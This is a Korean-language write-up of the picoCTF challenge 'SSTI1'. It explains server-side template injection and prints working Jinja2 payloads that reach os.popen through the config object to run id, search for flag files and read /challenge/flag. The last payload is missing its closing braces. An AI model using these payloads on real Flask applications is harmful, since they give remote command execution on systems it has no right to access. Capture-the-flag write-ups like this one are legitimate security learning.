# 문제명
SSTI1

## 문제 설명

> 웹사이트에서 공지사항 같은 내용을 입력할 수 있는 기능이 제공된다.

문제 설명에 "Templating is cool" 이라는 문구와 함께 SSTI(Server Side Template Injection) 힌트가 주어졌다.

- http://rescued-float.picoctf.net:51741/

## 풀이

### 분석

사이트에는 사용자가 원하는 내용을 입력할 수 있는 입력창이 있었다.

문제 제목이 SSTI1이고 힌트도 SSTI였기 때문에 먼저 SSTI가 가능한지 확인하였다.

입력창에 다음 내용을 입력하였다.

{{7*7}}

결과는 다음과 같았다.

49

원래라면 {{7*7}} 자체가 출력되어야 하지만 계산 결과인 49가 출력되었다.

이를 통해 서버가 입력값을 템플릿 코드로 실행하고 있다는 것을 확인할 수 있었다.

### 취약점

이 문제의 취약점은 SSTI(Server Side Template Injection)이다.

SSTI는 사용자가 입력한 문자열을 서버가 단순한 문자열이 아니라 템플릿 코드로 실행할 때 발생한다.

예를 들어 사용자가

{{7*7}}

를 입력했을 때

49

가 출력된다면 템플릿 엔진이 해당 내용을 실행하고 있다는 의미이다.

이러한 취약점이 존재하면 서버 내부 객체에 접근하거나 심한 경우 운영체제 명령 실행까지 가능해질 수 있다.

### 익스플로잇

먼저 Flask 환경인지 확인하기 위해 다음을 입력하였다.

{{config}}

결과로 Flask의 Config 객체가 출력되었다.

<Config {...}>

이를 통해 Flask + Jinja2 환경임을 알 수 있었다.

그 다음 운영체제 명령 실행이 가능한지 확인하였다.

{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

결과

uid=0(root) gid=0(root) groups=0(root)

Linux의 id 명령 결과가 출력되었다.

즉 서버에서 명령 실행이 가능하다는 것을 확인하였다.

이제 플래그 파일을 찾기 위해 시스템 전체에서 flag라는 이름이 포함된 파일을 검색하였다.

{{ config.__class__.__init__.__globals__['os'].popen('find / -iname "*flag*" 2>/dev/null').read() }}

결과

/challenge/flag

플래그 파일의 위치를 찾을 수 있었다.

찾은 파일을 읽어 플래그를 획득하였다.

{{ config.__class__.__init__.__globals__['os'].popen('cat /challenge/flag').read()

## 배운 점

SSTI는 사용자의 입력이 서버에서 템플릿 코드로 실행될 때 발생하는 취약점입니다.
{{7*7}} 같은 간단한 식으로 SSTI 여부를 확인할 수 있어서 간편했습니다.
Flask/Jinja2 환경에서는 config 같은 객체를 통해 내부 정보에 접근할 수 있습니다.

취약점이 확인되면 시스템 정보를 확인하고, 필요한 파일을 찾는 방식으로 문제를 해결할 수 있습니다.

이번 문제를 통해 SSTI의 기본적인 동작 원리에 대해 처음 접하고 실제 위험성을 이해할 수 있었습니.
